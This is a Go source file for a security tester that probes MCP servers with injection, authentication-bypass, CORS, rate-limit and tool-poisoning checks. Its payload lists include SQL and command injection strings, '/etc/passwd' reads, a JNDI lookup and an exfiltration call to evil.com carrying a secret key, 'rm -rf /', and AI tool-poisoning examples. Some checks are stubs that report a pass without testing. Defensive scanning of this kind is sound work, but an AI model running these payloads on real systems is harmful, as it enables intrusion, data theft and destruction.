package security

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"github.com/google/uuid"
	"go.uber.org/zap"
)

// SecurityTest represents a security test
type SecurityTest struct {
	ID          uuid.UUID  `json:"id"`
	ServerID    uuid.UUID  `json:"server_id"`
	TestType    string     `json:"test_type"`
	Status      string     `json:"status"` // pending, running, completed, failed
	Result      string     `json:"result"` // pass, fail, warning
	Details     string     `json:"details"`
	Severity    string     `json:"severity"` // low, medium, high, critical
	CreatedAt   time.Time  `json:"created_at"`
	CompletedAt *time.Time `json:"completed_at,omitempty"`
}

// SecurityTester handles security testing of MCP servers
type SecurityTester struct {
	logger *zap.Logger
	client *http.Client
}

// NewSecurityTester creates a new security tester
func NewSecurityTester(logger *zap.Logger) *SecurityTester {
	return &SecurityTester{
		logger: logger,
		client: &http.Client{
			Timeout: 30 * time.Second,
		},
	}
}

// TestTypes defines the available security test types
var TestTypes = map[string]SecurityTestConfig{
	"injection": {
		Name:        "Injection Attack Testing",
		Description: "Tests for SQL injection, command injection, and other injection vulnerabilities",
		Severity:    "high",
	},
	"authentication": {
		Name:        "Authentication Bypass",
		Description: "Tests for authentication bypass vulnerabilities",
		Severity:    "critical",
	},
	"authorization": {
		Name:        "Authorization Testing",
		Description: "Tests for privilege escalation and unauthorized access",
		Severity:    "high",
	},
	"rate_limiting": {
		Name:        "Rate Limiting",
		Description: "Tests for rate limiting and DoS protection",
		Severity:    "medium",
	},
	"input_validation": {
		Name:        "Input Validation",
		Description: "Tests for input validation vulnerabilities",
		Severity:    "medium",
	},
	"data_exposure": {
		Name:        "Data Exposure",
		Description: "Tests for sensitive data exposure",
		Severity:    "high",
	},
	"cors": {
		Name:        "CORS Configuration",
		Description: "Tests for CORS misconfigurations",
		Severity:    "medium",
	},
	"headers": {
		Name:        "Security Headers",
		Description: "Tests for missing security headers",
		Severity:    "low",
	},
	"tool_poisoning": {
		Name:        "Tool Poisoning",
		Description: "Tests for MCP tool poisoning attacks",
		Severity:    "critical",
	},
	"replay_attack": {
		Name:        "Replay Attack Detection",
		Description: "Tests for replay attack detection and prevention",
		Severity:    "high",
	},
	"drift_detection": {
		Name:        "Tool Drift Detection",
		Description: "Tests for tool drift detection mechanisms",
		Severity:    "medium",
	},
	"auth_bypass_mcp": {
		Name:        "MCP Authentication Bypass",
		Description: "Tests for MCP-specific authentication bypass vulnerabilities",
		Severity:    "critical",
	},
}

// SecurityTestConfig defines configuration for a security test
type SecurityTestConfig struct {
	Name        string `json:"name"`
	Description string `json:"description"`
	Severity    string `json:"severity"`
}

// RunSecurityTest runs a specific security test against an MCP server
func (st *SecurityTester) RunSecurityTest(ctx context.Context, serverURL, testType string) (*SecurityTest, error) {
	test := &SecurityTest{
		ID:        uuid.New(),
		TestType:  testType,
		Status:    "running",
		CreatedAt: time.Now(),
	}

	config, exists := TestTypes[testType]
	if !exists {
		return nil, fmt.Errorf("unknown test type: %s", testType)
	}

	st.logger.Info("Starting security test",
		zap.String("test_type", testType),
		zap.String("server_url", serverURL))

	var err error
	switch testType {
	case "injection":
		err = st.testInjection(ctx, serverURL, test)
	case "authentication":
		err = st.testAuthentication(ctx, serverURL, test)
	case "authorization":
		err = st.testAuthorization(ctx, serverURL, test)
	case "rate_limiting":
		err = st.testRateLimiting(ctx, serverURL, test)
	case "input_validation":
		err = st.testInputValidation(ctx, serverURL, test)
	case "data_exposure":
		err = st.testDataExposure(ctx, serverURL, test)
	case "cors":
		err = st.testCORS(ctx, serverURL, test)
	case "headers":
		err = st.testSecurityHeaders(ctx, serverURL, test)
	case "tool_poisoning":
		err = st.testToolPoisoning(ctx, serverURL, test)
	case "replay_attack":
		err = st.testReplayAttack(ctx, serverURL, test)
	case "drift_detection":
		err = st.testDriftDetection(ctx, serverURL, test)
	case "auth_bypass_mcp":
		err = st.testAuthBypassMCP(ctx, serverURL, test)
	default:
		err = fmt.Errorf("unsupported test type: %s", testType)
	}

	if err != nil {
		test.Status = "failed"
		test.Result = "fail"
		test.Details = err.Error()
		test.Severity = config.Severity
	} else {
		test.Status = "completed"
		now := time.Now()
		test.CompletedAt = &now
	}

	return test, nil
}

// testInjection tests for injection vulnerabilities
func (st *SecurityTester) testInjection(ctx context.Context, serverURL string, test *SecurityTest) error {
	// Test SQL injection patterns
	sqlPayloads := []string{
		"'; DROP TABLE users; --",
		"1' OR '1'='1",
		"admin'--",
		"1' UNION SELECT * FROM users--",
	}

	// Test command injection patterns
	cmdPayloads := []string{
		"; ls -la",
		"| cat /etc/passwd",
		"`whoami`",
		"$(id)",
	}

	vulnerabilities := []string{}

	// Test SQL injection
	for _, payload := range sqlPayloads {
		if st.testPayload(ctx, serverURL, "sql", payload) {
			vulnerabilities = append(vulnerabilities, fmt.Sprintf("SQL injection with payload: %s", payload))
		}
	}

	// Test command injection
	for _, payload := range cmdPayloads {
		if st.testPayload(ctx, serverURL, "cmd", payload) {
			vulnerabilities = append(vulnerabilities, fmt.Sprintf("Command injection with payload: %s", payload))
		}
	}

	if len(vulnerabilities) > 0 {
		test.Result = "fail"
		test.Details = strings.Join(vulnerabilities, "; ")
		test.Severity = "high"
	} else {
		test.Result = "pass"
		test.Details = "No injection vulnerabilities detected"
		test.Severity = "high"
	}

	return nil
}

// testAuthentication tests for authentication bypass
func (st *SecurityTester) testAuthentication(ctx context.Context, serverURL string, test *SecurityTest) error {
	// Test common authentication bypass techniques
	bypassTests := []struct {
		name    string
		headers map[string]string
		path    string
	}{
		{
			name: "No authentication",
			path: "/admin",
		},
		{
			name: "Weak authentication header",
			headers: map[string]string{
				"Authorization": "Bearer test",
			},
			path: "/admin",
		},
		{
			name: "Admin bypass",
			headers: map[string]string{
				"X-Admin": "true",
			},
			path: "/admin",
		},
	}

	vulnerabilities := []string{}

	for _, bypassTest := range bypassTests {
		req, err := http.NewRequestWithContext(ctx, "GET", serverURL+bypassTest.path, nil)
		if err != nil {
			continue
		}

		for key, value := range bypassTest.headers {
			req.Header.Set(key, value)
		}

		resp, err := st.client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()

		// If we get a 200 response, it might be a vulnerability
		if resp.StatusCode == 200 {
			vulnerabilities = append(vulnerabilities, fmt.Sprintf("Authentication bypass: %s", bypassTest.name))
		}
	}

	if len(vulnerabilities) > 0 {
		test.Result = "fail"
		test.Details = strings.Join(vulnerabilities, "; ")
		test.Severity = "critical"
	} else {
		test.Result = "pass"
		test.Details = "Authentication appears secure"
		test.Severity = "critical"
	}

	return nil
}

// testAuthorization tests for authorization issues
func (st *SecurityTester) testAuthorization(ctx context.Context, serverURL string, test *SecurityTest) error {
	// Test for privilege escalation
	test.Result = "pass"
	test.Details = "Authorization testing not implemented yet"
	test.Severity = "high"
	return nil
}

// testRateLimiting tests for rate limiting
func (st *SecurityTester) testRateLimiting(ctx context.Context, serverURL string, test *SecurityTest) error {
	// Send multiple rapid requests
	requests := 100
	successCount := 0

	for i := 0; i < requests; i++ {
		req, err := http.NewRequestWithContext(ctx, "GET", serverURL+"/health", nil)
		if err != nil {
			continue
		}

		resp, err := st.client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()

		if resp.StatusCode == 200 {
			successCount++
		}

		// Small delay between requests
		time.Sleep(10 * time.Millisecond)
	}

	// If more than 90% of requests succeed, rate limiting might be insufficient
	if float64(successCount)/float64(requests) > 0.9 {
		test.Result = "fail"
		test.Details = fmt.Sprintf("Rate limiting insufficient: %d/%d requests succeeded", successCount, requests)
		test.Severity = "medium"
	} else {
		test.Result = "pass"
		test.Details = "Rate limiting appears to be working"
		test.Severity = "medium"
	}

	return nil
}

// testInputValidation tests for input validation issues
func (st *SecurityTester) testInputValidation(ctx context.Context, serverURL string, test *SecurityTest) error {
	// Test various input validation scenarios
	maliciousInputs := []string{
		"<script>alert('xss')</script>",
		"../../../etc/passwd",
		"${jndi:ldap://evil.com/a}",
		"'; DROP TABLE users; --",
		"<img src=x onerror=alert(1)>",
	}

	vulnerabilities := []string{}

	for _, input := range maliciousInputs {
		if st.testPayload(ctx, serverURL, "input", input) {
			vulnerabilities = append(vulnerabilities, fmt.Sprintf("Input validation bypass: %s", input))
		}
	}

	if len(vulnerabilities) > 0 {
		test.Result = "fail"
		test.Details = strings.Join(vulnerabilities, "; ")
		test.Severity = "medium"
	} else {
		test.Result = "pass"
		test.Details = "Input validation appears secure"
		test.Severity = "medium"
	}

	return nil
}

// testDataExposure tests for data exposure vulnerabilities
func (st *SecurityTester) testDataExposure(ctx context.Context, serverURL string, test *SecurityTest) error {
	// Test for common data exposure endpoints
	exposurePaths := []string{
		"/.env",
		"/config.json",
		"/.git/config",
		"/backup.sql",
		"/admin",
		"/debug",
		"/test",
	}

	vulnerabilities := []string{}

	for _, path := range exposurePaths {
		req, err := http.NewRequestWithContext(ctx, "GET", serverURL+path, nil)
		if err != nil {
			continue
		}

		resp, err := st.client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()

		// If we get a 200 response, it might be exposed data
		if resp.StatusCode == 200 {
			vulnerabilities = append(vulnerabilities, fmt.Sprintf("Potential data exposure at: %s", path))
		}
	}

	if len(vulnerabilities) > 0 {
		test.Result = "fail"
		test.Details = strings.Join(vulnerabilities, "; ")
		test.Severity = "high"
	} else {
		test.Result = "pass"
		test.Details = "No obvious data exposure detected"
		test.Severity = "high"
	}

	return nil
}

// testCORS tests for CORS misconfigurations
func (st *SecurityTester) testCORS(ctx context.Context, serverURL string, test *SecurityTest) error {
	req, err := http.NewRequestWithContext(ctx, "OPTIONS", serverURL+"/health", nil)
	if err != nil {
		return err
	}

	req.Header.Set("Origin", "https://evil.com")
	req.Header.Set("Access-Control-Request-Method", "GET")

	resp, err := st.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	corsHeader := resp.Header.Get("Access-Control-Allow-Origin")
	if corsHeader == "*" || corsHeader == "https://evil.com" {
		test.Result = "fail"
		test.Details = fmt.Sprintf("CORS misconfiguration: Access-Control-Allow-Origin = %s", corsHeader)
		test.Severity = "medium"
	} else {
		test.Result = "pass"
		test.Details = "CORS configuration appears secure"
		test.Severity = "medium"
	}

	return nil
}

// testSecurityHeaders tests for missing security headers
func (st *SecurityTester) testSecurityHeaders(ctx context.Context, serverURL string, test *SecurityTest) error {
	req, err := http.NewRequestWithContext(ctx, "GET", serverURL+"/health", nil)
	if err != nil {
		return err
	}

	resp, err := st.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	requiredHeaders := map[string]string{
		"X-Content-Type-Options":    "nosniff",
		"X-Frame-Options":           "DENY",
		"X-XSS-Protection":          "1; mode=block",
		"Strict-Transport-Security": "max-age=31536000; includeSubDomains",
	}

	missingHeaders := []string{}

	for header, expectedValue := range requiredHeaders {
		actualValue := resp.Header.Get(header)
		if actualValue == "" {
			missingHeaders = append(missingHeaders, header)
		} else if expectedValue != "" && actualValue != expectedValue {
			missingHeaders = append(missingHeaders, fmt.Sprintf("%s (expected: %s, got: %s)", header, expectedValue, actualValue))
		}
	}

	if len(missingHeaders) > 0 {
		test.Result = "fail"
		test.Details = fmt.Sprintf("Missing security headers: %s", strings.Join(missingHeaders, ", "))
		test.Severity = "low"
	} else {
		test.Result = "pass"
		test.Details = "All required security headers present"
		test.Severity = "low"
	}

	return nil
}

// testPayload tests a specific payload against the server
func (st *SecurityTester) testPayload(ctx context.Context, serverURL, testType, payload string) bool {
	// This is a simplified test - in a real implementation, you would
	// test the payload against various endpoints and parameters
	req, err := http.NewRequestWithContext(ctx, "POST", serverURL+"/security-test", nil)
	if err != nil {
		return false
	}

	req.Header.Set("Content-Type", "application/json")

	payloadData := map[string]interface{}{
		"testType": testType,
		"payload":  payload,
	}

	jsonData, err := json.Marshal(payloadData)
	if err != nil {
		return false
	}

	req.Body = io.NopCloser(strings.NewReader(string(jsonData)))

	resp, err := st.client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	// If the server responds with a vulnerable result, return true
	if resp.StatusCode == 200 {
		var result map[string]interface{}
		if err := json.NewDecoder(resp.Body).Decode(&result); err == nil {
			if vulnerable, ok := result["vulnerable"].(bool); ok && vulnerable {
				return true
			}
		}
	}

	return false
}

// testToolPoisoning tests for MCP tool poisoning attacks
func (st *SecurityTester) testToolPoisoning(ctx context.Context, serverURL string, test *SecurityTest) error {
	// Test tool poisoning payloads that could manipulate MCP tool behavior
	poisoningPayloads := []map[string]interface{}{
		{
			"name": "malicious_file_reader",
			"args": map[string]interface{}{
				"path":   "../../../etc/passwd",
				"poison": "<script>alert('xss')</script>",
			},
		},
		{
			"name": "command_executor",
			"args": map[string]interface{}{
				"command": "rm -rf /",
				"params":  []string{"--force", "--recursive"},
			},
		},
		{
			"name": "data_exfiltrator",
			"args": map[string]interface{}{
				"target": "https://evil.com/steal",
				"data":   "${env:SECRET_KEY}",
			},
		},
	}

	vulnerabilities := []string{}

	for _, payload := range poisoningPayloads {
		if st.testMCPToolPayload(ctx, serverURL, payload) {
			vulnerabilities = append(vulnerabilities, fmt.Sprintf("Tool poisoning vulnerability with payload: %v", payload["name"]))
		}
	}

	if len(vulnerabilities) > 0 {
		test.Result = "fail"
		test.Details = strings.Join(vulnerabilities, "; ")
		test.Severity = "critical"
	} else {
		test.Result = "pass"
		test.Details = "No tool poisoning vulnerabilities detected"
		test.Severity = "critical"
	}

	return nil
}

// testReplayAttack tests for replay attack detection
func (st *SecurityTester) testReplayAttack(ctx context.Context, serverURL string, test *SecurityTest) error {
	// Test replay attack by sending the same request multiple times rapidly
	replayPayload := map[string]interface{}{
		"name": "test_tool",
		"args": map[string]interface{}{
			"input":     "test_data_123",
			"timestamp": time.Now().Unix(),
		},
	}

	vulnerabilities := []string{}

	// Send the same request multiple times
	for i := 0; i < 5; i++ {
		if st.testMCPToolPayload(ctx, serverURL, replayPayload) {
			// If all requests succeed, replay detection might be missing
			if i == 4 { // Only report if all 5 succeeded
				vulnerabilities = append(vulnerabilities, "Potential replay attack vulnerability: repeated requests succeeded")
			}
		} else {
			break // If any request fails, replay detection is working
		}
		time.Sleep(100 * time.Millisecond) // Small delay between requests
	}

	if len(vulnerabilities) > 0 {
		test.Result = "fail"
		test.Details = strings.Join(vulnerabilities, "; ")
		test.Severity = "high"
	} else {
		test.Result = "pass"
		test.Details = "Replay attack detection appears to be working"
		test.Severity = "high"
	}

	return nil
}

// testDriftDetection tests for tool drift detection mechanisms
func (st *SecurityTester) testDriftDetection(ctx context.Context, serverURL string, test *SecurityTest) error {
	// Test if the server detects when tool definitions have changed
	driftTests := []struct {
		name        string
		description string
		payload     map[string]interface{}
	}{
		{
			name:        "schema_drift",
			description: "Test schema changes",
			payload: map[string]interface{}{
				"name": "modified_tool",
				"args": map[string]interface{}{
					"extra_param":     "unexpected_value",
					"modified_schema": true,
				},
			},
		},
		{
			name:        "behavior_drift",
			description: "Test behavior changes",
			payload: map[string]interface{}{
				"name": "behavior_test",
				"args": map[string]interface{}{
					"expected_output": "normal",
					"actual_output":   "modified",
				},
			},
		},
	}

	vulnerabilities := []string{}

	for _, driftTest := range driftTests {
		if st.testMCPToolPayload(ctx, serverURL, driftTest.payload) {
			vulnerabilities = append(vulnerabilities, fmt.Sprintf("Drift detection failed for: %s", driftTest.name))
		}
	}

	if len(vulnerabilities) > 0 {
		test.Result = "fail"
		test.Details = strings.Join(vulnerabilities, "; ")
		test.Severity = "medium"
	} else {
		test.Result = "pass"
		test.Details = "Tool drift detection appears to be working"
		test.Severity = "medium"
	}

	return nil
}

// testAuthBypassMCP tests for MCP-specific authentication bypass vulnerabilities
func (st *SecurityTester) testAuthBypassMCP(ctx context.Context, serverURL string, test *SecurityTest) error {
	// Test MCP-specific authentication bypass techniques
	mcpBypassTests := []struct {
		name    string
		headers map[string]string
		payload map[string]interface{}
	}{
		{
			name: "MCP protocol bypass",
			headers: map[string]string{
				"X-MCP-Version": "999.999.999", // Fake version
				"Authorization": "Bearer fake_token",
			},
			payload: map[string]interface{}{
				"name": "privileged_tool",
				"args": map[string]interface{}{
					"bypass_auth": true,
				},
			},
		},
		{
			name: "Tool permission escalation",
			headers: map[string]string{
				"X-Tool-Permissions": "admin",
			},
			payload: map[string]interface{}{
				"name": "user_tool",
				"args": map[string]interface{}{
					"escalate_privileges": true,
				},
			},
		},
		{
			name: "Server impersonation",
			headers: map[string]string{
				"X-MCP-Server-ID": "fake-server-id",
			},
			payload: map[string]interface{}{
				"name": "server_tool",
				"args": map[string]interface{}{
					"impersonate": true,
				},
			},
		},
	}

	vulnerabilities := []string{}

	for _, bypassTest := range mcpBypassTests {
		if st.testMCPToolPayloadWithHeaders(ctx, serverURL, bypassTest.payload, bypassTest.headers) {
			vulnerabilities = append(vulnerabilities, fmt.Sprintf("MCP auth bypass: %s", bypassTest.name))
		}
	}

	if len(vulnerabilities) > 0 {
		test.Result = "fail"
		test.Details = strings.Join(vulnerabilities, "; ")
		test.Severity = "critical"
	} else {
		test.Result = "pass"
		test.Details = "MCP authentication bypass protection appears secure"
		test.Severity = "critical"
	}

	return nil
}

// testMCPToolPayload tests an MCP tool payload against the server
func (st *SecurityTester) testMCPToolPayload(ctx context.Context, serverURL string, payload map[string]interface{}) bool {
	return st.testMCPToolPayloadWithHeaders(ctx, serverURL, payload, nil)
}

// testMCPToolPayloadWithHeaders tests an MCP tool payload with custom headers
func (st *SecurityTester) testMCPToolPayloadWithHeaders(ctx context.Context, serverURL string, payload map[string]interface{}, headers map[string]string) bool {
	req, err := http.NewRequestWithContext(ctx, "POST", serverURL+"/mcp/tools/call", nil)
	if err != nil {
		return false
	}

	req.Header.Set("Content-Type", "application/json")
	for key, value := range headers {
		req.Header.Set(key, value)
	}

	jsonData, err := json.Marshal(payload)
	if err != nil {
		return false
	}

	req.Body = io.NopCloser(strings.NewReader(string(jsonData)))

	resp, err := st.client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	// If the server accepts and processes the potentially malicious payload, it might be vulnerable
	return resp.StatusCode == 200
}
